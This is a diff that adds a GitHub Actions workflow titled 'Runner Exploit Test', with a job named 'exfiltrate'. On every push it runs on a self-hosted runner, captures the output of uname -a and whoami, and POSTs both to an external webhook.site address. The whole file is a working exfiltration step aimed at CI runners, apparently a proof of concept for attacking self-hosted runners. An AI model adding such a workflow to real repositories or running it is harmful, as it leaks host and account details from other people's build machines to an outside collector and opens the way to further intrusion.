@@ -1,0 +1,15 @@
+name: Runner Exploit Test
+on: push
+
+jobs:
+  exfiltrate:
+    name: Leak uname and whoami
+    runs-on: self-hosted
+    steps:
+      - name: Collect system info
+        run: |
+          uname_out=$(uname -a)
+          whoami_out=$(whoami)
+          curl -X POST -H "Content-Type: text/plain" \
+            --data "uname: $uname_out\nwhoami: $whoami_out" \
+            https://webhook.site/2cb5ef2c-6be6-442b-9a0b-180c98f44d10
